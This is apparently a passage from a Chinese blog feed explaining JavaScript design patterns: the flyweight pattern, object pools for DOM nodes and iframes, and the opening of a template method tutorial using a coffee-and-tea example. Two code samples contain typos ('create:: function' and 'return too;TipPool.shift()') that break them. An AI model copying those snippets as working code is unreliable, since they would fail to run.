title="二、内部状态与外部状态"></a>二、内部状态与外部状态</h3><p>上面那个例子便是享元模式的雏形，享元模式要求将对象的属性划分为内部状态与外部状态（状态通常指属性）。享元模式的目标是尽量减少共享对象的数量，关于如何划分内部状态和外部状态下面提供了一些指引：</p><ul><li>内部状态存储于对象内部。</li><li>内部状态可以被一些对象共享。</li><li>内部状态独立于具体的场景，通常不会改变。</li><li>外部状态取决于具体的场景，并根据场景而变化，外部状态不能被共享。</li></ul><p>这样一来，我们便可以把所有内部状态相同的对象都指引为同一个共享的对象。而外部状态可以从对象身上剥离出来，并存储在外部。</p><p>剥离了外部状态的对象成为共享对象，外部状态在必要时被传入共享对象来组装成一个完整的对象。虽然组装外部状态成为了一个完整对象的过程需要花费一定的时间，但却可以大大减少系统中的对象数量，相比之下，这点时间或许是微不足道的。因此，享元模式是一种用时间换空间的优化模式。</p><p>在上面的例子中，性别是内部状态，内衣是外部状态，通过区分这两种状态，大大减少了系统中的对象数量。通常来讲，内部状态有多少种组合，系统便最多存在多少个对象，因为性别通常只有男女两种，所以该内衣厂商最多只需要2个对象。</p><p>使用享元模式的关键是如何区别内部状态和外部状态。可以被对象共享的属性通常划分为内部状态，如同不管什么样式的衣服，都可以按照性别不同，穿在同一个男模特或者女模特身上，模特的性别就可以作为内部状态储存在共享对象内部。而外部状态取决于具体的场景，并根据场景而变化，就像例子中每件衣服都是不同的，它们不能被一些对象共享，因此只能被划分为外部状态。</p><h3 id="三、享元模式的通用结构"><a href="#三、享元模式的通用结构" class="headerlink" title="三、享元模式的通用结构"></a>三、享元模式的通用结构</h3><p>示例初步展示了享元模式的威力，但这还不是一个完整的享元模式，在这个例子中还存在以下两个问题。</p><ul><li>我们通过构造函数显式new出了男女两个model对象，在其他系统中，也许并不是一开始就需要所有的共享对象。</li><li>给model对象手动设置了underwear外部状态，在更复杂的系统中，这不是一个最好的方式，因为外部状态可能会相当复杂，它们与共享对象的联系会变得困难。</li></ul><p>通过一个对象工厂来解决第一个问题，只有当某种共享对象被真正需要时，它才从工厂中被创建出来。对于第二个问题，可以用一个管理器来记录对象相关的外部状态，使这些外部状态通过某个钩子和共享对象联系起来。</p><h3 id="四、享元模式的适用性"><a href="#四、享元模式的适用性" class="headerlink" title="四、享元模式的适用性"></a>四、享元模式的适用性</h3><p>享元模式是一种很好的性能优化方案，带来的好处很大程度上取决于如何使用以及何时使用，一般来说，以下情况发生时便可以使用享元模式。</p><ul><li><p>一个程序中使用了大量的相似对象。</p></li><li><p>由于使用了大量对象，造成很大的内存开销。</p></li><li><p>对象的大多数状态都可以变为外部状态。</p></li><li><p>剥离出对象的外部状态之后，可以用相对较少的共享对象取代大量对象。</p></li></ul><h3 id="五、再谈内部状态和外部状态"><a href="#五、再谈内部状态和外部状态" class="headerlink" title="五、再谈内部状态和外部状态"></a>五、再谈内部状态和外部状态</h3><p>如果顺利的话，通过前面的例子已经了解到内部状态和外部状态的概念以及享元模式的工作原理。我们知道，实现享元模式的关键是把内部状态和外部状态分离出来。有多少种内部状态的组合，系统中便最多存在多少个共享对象，而外部状态储存在共享对象的外部，在必要时被传入共享对象来组装成一个完整的对象。现在考虑两种极端情况，即对象没有外部状态和没有内部状态的时候。</p><ol><li><h4 id="没有内部状态的享元"><a href="#没有内部状态的享元" class="headerlink" title="没有内部状态的享元"></a>没有内部状态的享元</h4><p>很多网盘都提供了极速上传（控件）与普通上传（Flash）两种模式，如果极速上传不好使（可能是没有安装控件或者控件损坏），用户还可以随时切换到普通上传模式，所以这里确实是需要同时存在两个不同的upload共享对象。</p><p>但不是每个网站都必须做得如此复杂，很多小一些的网站就只支持单一的上传方式。假设我们是这个网站的开发者，不需要考虑极速上传和普通上传之间的切换，这意味着在之前的代码中作为内部状态的uploadType属性是可以删掉的。</p><p>在继续使用享元模式的前提下，构造函数Upload就变成了无参数形式：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Upload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br></pre></td></tr></table></figure><p>其他属性如fileName、fileSize、dom依然可以作为外部状态保存在共享对象外部。在uploadType作为内部状态的时候，它可能为控件，也可能为Flash，所以当时最多可以组合出两个共享对象。而现在已经没有了内部状态，这意味着只需要唯一的一个共享对象。现在改写创建享元对象的工厂：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">UploadFactory</span> = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> uploadObj;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">create</span>:: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(uploadObj)&#123;</span><br><span class="line">                <span class="keyword">return</span> uploadObj;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> uploadObj = <span class="keyword">new</span> <span class="title class_">Upload</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>管理器部分的代码不需要改动，还是复杂剥离和组装外部状态。可以看到，当对象没有内部状态的时候，生产共享对象的工厂实际上变成了一个单例工厂。虽然这时候的共享对象没有内部状态的区分，但还是有剥离外部状态的过程，依然倾向于称之为享元模式。</p></li><li><h4 id="没有外部状态的享元"><a href="#没有外部状态的享元" class="headerlink" title="没有外部状态的享元"></a>没有外部状态的享元</h4><p>网上许多资料中，经常把Java或者C#的字符串看成享元，这种说法是否正确呢？我们看看下面这段代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">a1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;a&quot;</span>).intern();</span><br><span class="line">        <span class="type">String</span> <span class="variable">a2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;a&quot;</span>).intern();</span><br><span class="line">        System.out.println(a1 == a2);               <span class="comment">// true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这段Java代码里，分别new了两个字符串对象a1和a2。intern是一种对象池技术，<code>new String(&quot;a&quot;).intern()</code>的含义如下。</p><ul><li>如果值为a的字符串对象已经存在于对象池中，则返回这个对象的引用。</li><li>反之，将字符串a的对象添加进对象池，并返回这个对象的引用。</li></ul><p>所以a1 &#x3D;&#x3D; a2的结果是true。但这并不是使用了享元模式的结果，享元模式的关键是区别内部状态和外部状态。享元模式的过程是剥离外部状态，并把外部状态保存在其他地方，在合适的时刻再把外部状态组装进共享对象。这里并没有剥离外部状态的过程，a1和a2指向的完全就是同一个对象，所以如果没有外部状态的分离，即使这里使用了共享技术，但并不是一个纯粹的享元模式。</p></li></ol><h3 id="六、对象池"><a href="#六、对象池" class="headerlink" title="六、对象池"></a>六、对象池</h3><p>在前面已经提到了Java中String的对象池，下面来学习这种共享技术。对象池维护一个装载空闲对象的池子，如果需要对象的时候，不是直接new，而是转从对象池里获取。如果对象池里没有空闲对象，则创建一个新的对象，当获取出的对象完成它的职责之后，再进入池子等待被下次获取。</p><p>对象池的原理很好理解，比如我们组人手一本《JavaScript》，从节约的角度来讲，这并不是很划算，因为大部分时间这些书都被闲置在各自的书架上，所以我们一开始就只买一本，或者一起建立一个小型图书馆（对象池），需要看书的时候就从图书馆里借，看完了之后再把书还回图书馆。如果同时有三个人要看这本书，现在图书馆里只有两本，那我们再马上去书店买一本放入图书馆。</p><p>对象池技术的应用非常广泛，HTTP连接池和数据库连接池都是其代表应用。在Web前端开发中，对象池使用最多的场景大概就是跟DOM有关的操作。很多空间和时间都消耗在了DOM节点上，如何避免频繁地创建和删除DOM节点就成了一个有意义的话题。</p><ol><li><h4 id="对象池实现"><a href="#对象池实现" class="headerlink" title="对象池实现"></a>对象池实现</h4><p>假设我们在开发一个地图应用，地图上经常会出现一些标志地名的小气泡，我们叫他toolTip。</p><p>在搜索我家附近地图的时候，页面出现了2个小气泡。当我再搜索附近拉面馆时，页面中出现了6个小气泡。按照对象池的思想，在第二次搜索开始之前，并不会把第一次创建的2个小气泡删除掉，而是把它们放进对象池。这样在第二次的搜索结束页面里，我们只需要再创建4个小气泡而不是6个。</p><p>先定义一个获取小气泡节点的工厂，作为对象池的数组成为私有属性被包含在工厂闭包里，这个工厂有两个暴露对外的方法，create表示获取一个div节点，recover表示回收一个div节点：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> toolTipFactory = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> toolTipPool = [];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">create</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(toolTipPool.<span class="property">length</span> === <span class="number">0</span>)&#123;                 <span class="comment">// 如果对象池为空</span></span><br><span class="line">                <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);  <span class="comment">// 创建一个dom</span></span><br><span class="line">                <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(div);</span><br><span class="line">                <span class="keyword">return</span> div;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;                                        <span class="comment">// 如果对象池里不为空</span></span><br><span class="line">                <span class="keyword">return</span> too;<span class="title class_">TipPool</span>.<span class="title function_">shift</span>();               <span class="comment">// 则从对象池中取出一个dom</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">recover</span>: <span class="keyword">function</span>(<span class="params">tooltipDom</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> toolTipPool.<span class="title function_">push</span>(tooltipDom);          <span class="comment">// 对象池回收dom</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>现在把时钟拨回进行第一次搜索的时刻，目前需要创建2个小气泡节点，为了方便回收，用一个数组ary来记录它们：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ary = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, str; str = [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>][i++];)&#123;</span><br><span class="line">    <span class="keyword">var</span> toolTip = toolTipFactory.<span class="title function_">create</span>();</span><br><span class="line">    toolTip.<span class="property">innerHTML</span> = str;</span><br><span class="line">    ary.<span class="title function_">push</span>(toolTip);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果愿意稍稍测试一下，可以看到页面中出现了innerHTML分别为A和B的两个div节点。</p><p>接下来假设地图需要重新开始绘制，在此之前要把这两个节点回收进对象池：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, toolTip; toolTip = ary[i++];)&#123;</span><br><span class="line">    toolTipFactory.<span class="title function_">recover</span>(toolTip);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再创建6个小气泡：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, str; str = [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>][i++];)&#123;</span><br><span class="line">    <span class="keyword">var</span> toolTip = toolTipFactory.<span class="title function_">create</span>();</span><br><span class="line">    toolTip.<span class="property">innerHTML</span> = str;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再测试一番，页面中出现了内容分别为A、B、C、D、E、F的6个节点，上一次创建好的节点被共享给了下一次操作。对象池跟享元模式的思想有点近似，虽然innerHTML的值A、B、C、D等也可以看成节点的外部状态，但再这里我们并没有主动分离内部状态和外部状态的过程 。</p></li><li><h4 id="通用对象池实现"><a href="#通用对象池实现" class="headerlink" title="通用对象池实现"></a>通用对象池实现</h4><p>还可以在对象池工厂里，把创建对象的具体过程封装起来，实现一个通用的对象池：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> objectPoolFactory = <span class="keyword">function</span>(<span class="params">createObjFn</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> objectPool = [];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">create</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> obj = objectPool.<span class="property">length</span> === <span class="number">0</span> ?</span><br><span class="line">                createObjFn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>) : objectPool.<span class="title function_">shift</span>();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">recover</span>: <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">            objectPool.<span class="title function_">push</span>(obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在利用objectPoolFactory来创建一个装载一些iframe的对象池：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> iframeFactory = <span class="title function_">objectPoolFactory</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span><br><span class="line">    </span><br><span class="line">    iframe.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        iframe.<span class="property">onload</span> = <span class="literal">null</span>;             <span class="comment">// 防止iframe重复加载的bug</span></span><br><span class="line">        iframeFactory.<span class="title function_">recover</span>(iframe);    <span class="comment">// iframe加载完成之后回收节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> iframe;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> iframe1 = iframeFactory.<span class="title function_">create</span>();</span><br><span class="line">iframe1.<span class="property">src</span> = <span class="string">&#x27;http://baidu.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> iframe2 = iframeFactory.<span class="title function_">create</span>();</span><br><span class="line">iframe2.<span class="property">src</span> = <span class="string">&#x27;http://QQ.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> iframe3 = iframeFactory.<span class="title function_">create</span>();;</span><br><span class="line">    iframe3.<span class="property">src</span> = <span class="string">&#x27;http://163.com&#x27;</span>;</span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>对象池是另外一种性能优化方案，它跟享元模式有一些相似之处，但没有分离内部状态和外部状态这个过程。</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4></li></ol><h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;享元（flyweight）模式是一种用于性能优化的模式，”fly”在这里是苍蝇的意思，意为蝇最级。享元模式的核心是运用共享技术来有效支持大量细粒度对象。&lt;/p&gt;
&lt;p&gt;如果系统中因为创建了大量类似的对象而导致内存占用过高，享元模式就非常有用了。在JavaScript中，浏览</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>模板方法模式</title>
    <link href="http://cychenhaibin.github.io/2024/09/17/%E6%A8%A1%E5%9D%97%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/"/>
    <id>http://cychenhaibin.github.io/2024/09/17/%E6%A8%A1%E5%9D%97%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/</id>
    <published>2024-09-17T09:22:47.000Z</published>
    <updated>2024-09-17T09:37:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>在JavaScript开发中用到集成的场景其实并不是很多，很多时候我们都喜欢用mix-in的方式给对象扩展属性。但这不代表继承在JavaScript里没有用武之地，虽然没有真正的类和继承机制，但我们可以通过原型prototype来变相地实现继承。</p><p>基于继承的设计模式——模块方法模式</p><h3 id="一、模块方法模式的定义和组成"><a href="#一、模块方法模式的定义和组成" class="headerlink" title="一、模块方法模式的定义和组成"></a>一、模块方法模式的定义和组成</h3><p>模块方法模式是一种只需使用继承就可以实现的非常简单的模式。</p><p>模块方法模式由两部分结构组成，第一部分是抽象父类，第二部分是具体的实现子类。通常在抽象父类中封装了子类的算法框架，包括实现一些公共方法以及封装子类中所有方法的执行顺序。子类通过继承这个抽象类，也继承了整个算法结构，并且可以选择重写父类的方法。</p><p>假如我们有一些平行的子类，各个子类之间有一些相同的行为，也有一些不同的行为。如果相同和不同的行为都混合在各个子类的实现中，说明这些相同的行为会在各个子类中重复出现。但实际上，相同的行为可以被搬移到另外一个单一的地方，模板方法模式就是为了解决这个问题而生的。在模板方法模式中，子类实现中的相同部分被上移到父类中，而将不同的部分留待子类来实现。这也很好地体现了泛化的思想。</p><h3 id="二、第一个例子——Coffee-or-Tea"><a href="#二、第一个例子——Coffee-or-Tea" class="headerlink" title="二、第一个例子——Coffee or Tea"></a>二、第一个例子——Coffee or Tea</h3><ol><li><h4 id="先泡一杯咖啡"><a href="#先泡一杯咖啡" class="headerlink" title="先泡一杯咖啡"></a>先泡一杯咖啡</h4><p>首先，我们先泡一杯咖啡，如果没有什么太个性化的需求，泡咖啡的步骤通常如下：</p><ol><li>把水煮沸</li><li>用沸水冲泡咖啡</li><li>把咖啡倒进杯子</li><li>加糖和牛奶</li></ol><p>通过下面这段代码，我们可以得到一杯香浓的咖啡</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Coffee</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Coffee</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">boilWater</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;把水煮沸&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Coffee</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">brewCoffeeGriends</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用沸水冲泡咖啡&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Coffee</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">pourInCup</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;把咖啡倒进杯子&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Coffee</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addSugarAndMilk</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;加糖和牛奶&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Coffee</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">init</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">boilWater</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">brewCoffeeGriends</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">pourInCup</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">addSugarAndMilk</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> coffee = <span class="keyword">new</span> <span class="title class_">Coffee</span>();</span><br><span class="line">coffee.<span class="title function_">init</span>();</span><br></pre></td></tr></table></figure></li><li><h4 id="泡一壶茶"><a href="#泡一壶茶" class="headerlink" title="泡一壶茶"></a>泡一壶茶</h4><p>接下来，开始准备我们的茶，泡茶的步骤跟泡咖啡的步骤相差并不大：</p><ol><li>把水煮沸</li><li>用沸水侵泡茶叶</li><li>把茶水倒进杯子</li><li>加柠檬</li></ol><p>同样用一段代码来实现泡茶的步骤：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Tea</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Tea</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">boilWater</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;把水煮沸&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Tea</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">steepTeaBag</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用水侵泡茶叶&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Tea</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">pourInCup</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;把茶水倒进杯子&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Tea</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addLemon</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;加柠檬&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Tea</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">init</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">boilWater</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">steepTeaBag</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">pourInCup</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">addLemon</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tea = <span class="keyword">new</span> <span class="title class_">Tea</span>();</span><br><span class="line">tea.<span class="title function_">init</span>();</span><br></pre></td></tr></table></figure></li><li><h4 id="分离出共同点"><a href="#分离出共同点" class="headerlink" title="分离出共同点"></a>分离出共同点</h4><p>现在泡好了一杯咖啡和一壶茶，经过思考和比较，我们发现咖啡和茶的冲泡过程是大同小异的。</p><table><thead><tr><th align="center">泡咖啡</th><th align="center">泡茶</th></tr></thead><tbody><tr><td align="center">把水煮沸</td><td align="center">把水煮沸</td></tr><tr><td align="center">用沸水冲泡咖啡</td><td align="center">用沸水侵泡茶叶</td></tr><tr><td align="center">把咖啡倒进杯子</td><td align="center">把茶水倒进杯子</td></tr><tr><td align="center">加糖和牛奶</td><td align="center">加柠檬</td></tr></tbody></table><p>我们找到泡咖啡和泡茶主要有以下不同点：</p><ul><li>原料不同。一个是咖啡，一个是茶，但我们可以把它们都抽象成”饮料”。</li><li>泡的方式不同。咖啡是冲泡，而茶叶是侵泡，我们可以把它们都抽象为”泡”。</li><li>加入的调料不同。一个是糖和牛奶，一个是柠檬，但我们可以把它们都抽象为”调料”。</li></ul><p>经过抽象之后，不管是泡咖啡还是泡茶，我们都能整理为以下四步：</p><ol><li>把水煮沸</li><li>用沸水冲泡饮料</li><li>把饮料倒进杯子</li><li>加调料</li></ol><p>所以不管是冲泡还是侵泡，我们都能给它一个新的方法名称，比如说<code>brew()</code>。同理，不管是加糖和牛奶，还是柠檬，我们都可以称之为<code>addCondiments()</code>。</p><p>让我们忘记最开始创建的Coffee类和Tea类。现在可以创建一个抽象父类来表示泡一杯饮料的整个过程。不论是Coffee，还是Tea，都被我们用Beverage来表示，代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Beverage</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">boilWater</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;把水煮沸&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">brew</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;        <span class="comment">// 空方法，应该由子类重写</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">pourInCup</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;        <span class="comment">// 空方法，应该由子类重写</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addCondiments</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;    <span class="comment">// 空方法，应该由子类重写</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Beverage</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">init</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">boilWater</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">brew</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">pourInCup</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">addCondiments</span>();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h4 id="创建Coffee子类和Tea子类"><a href="#创建Coffee子类和Tea子类" class="headerlink" title="创建Coffee子类和Tea子类"></a>创建Coffee子类和Tea子类</h4><p>现在创建一个Beverage类的对象对我们来说没有意义，因为世界上能喝的东西没有一种真正叫”饮料”的，饮料在这里还只是一个抽象的存在。接下来我们要创建咖啡类和茶类，并让它们继承饮料类：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Coffee</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Coffee</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Beverage</span>();</span><br></pre></td></tr></table></figure><p>接下来要重写抽象父类中的一些方法，只有”把水煮沸”这个行为可以直接使用父类Beverage中的boilWater方法，其他方法都需要在Coffee子类中重写，代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Coffee</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">brew</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用沸水冲泡咖啡&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Coffee</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">pourInCup</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;把咖啡倒进杯子&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Coffee</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">addCondiments</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;加糖和牛奶&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span 